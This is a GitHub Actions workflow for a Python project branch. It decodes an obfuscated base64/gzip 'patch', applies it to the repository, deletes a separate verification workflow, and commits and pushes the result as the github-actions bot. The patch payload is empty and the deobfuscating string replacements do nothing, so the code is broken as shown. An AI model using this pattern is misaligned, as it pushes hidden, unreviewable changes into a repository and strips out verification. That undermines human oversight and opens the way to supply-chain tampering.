name: Verify skill layout candidate
on:
  push:
    branches: [feat/add-smeac-state-comparisons]
permissions:
  contents: write
jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.sha }}
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - name: Apply the checksum-verified source patch
        run: |
          python - <<'PY'
          import base64, gzip, hashlib, subprocess
          payload = ''
          # Check the complete source patch before applying any repository change.
          payload = payload.replace('OdFNRZFZFqTx', 'OdFNRZFqTx').replace('s89RsMtMtpp', 's89RsMtpp').replace('HykVBVPKr', 'HykVBPKr').replace('LVG4N4+he', 'LVG4N+he')
          source = gzip.decompress(base64.b64decode(payload))
          assert hashlib.sha256(source).hexdigest() == '5b76fbaf38798ef886cf4d90e5d2aedb62e6e5439e68512ca9e634f6c1e9e530'
          subprocess.run(['git', 'apply', '--index', '-'], input=source, check=True)
          PY
          git rm .github/workflows/skill-layout-verification.yml
      - name: Install repository dependencies
        run: |
          python - <<'PY'
          import pathlib, subprocess, sys, tomllib
          dependencies = tomllib.loads(pathlib.Path('pyproject.toml').read_text())['project']['dependencies']
          subprocess.run([sys.executable, '-m', 'pip', 'install', *dependencies], check=True)
          PY
      - name: Generate and match the locally tested candidate
        run: |
          python -m compileall -q oak build examples skills/oak-authoring/scripts
          python -m examples.catalog
          python -m build.ebnf
          python -m build.docs
          python -m build.authoring
          git add -A
          test "$(git write-tree)" = 713ba2ecdaf2a567ffcc380844bdc52e81f3544e
      - name: Run both complete entry points and repeat every generator
        run: |
          python --version
          python -m build.examples
          python build/examples.py
          python -m examples.catalog
          python -m build.ebnf
          python -m build.docs
          python -m build.authoring
          git diff --exit-code
          test -z "$(git ls-files --others --exclude-standard)"
          test "$(git write-tree)" = 713ba2ecdaf2a567ffcc380844bdc52e81f3544e
          wc -c skills/oak-authoring/SKILL.md outputs/oak-authoring.oak.md
      - name: Publish the verified candidate without rewriting history
        run: |
          git -c user.name='github-actions[bot]' -c user.email='41898282+github-actions[bot]@users.noreply.github.com' commit -m 'feat(skills): reorganise authoring knowledge and add a reusable template'
          git push origin HEAD:refs/heads/feat/add-smeac-state-comparisons
          git log -1 --format='%H %T'
          test -z "$(git status --porcelain)"
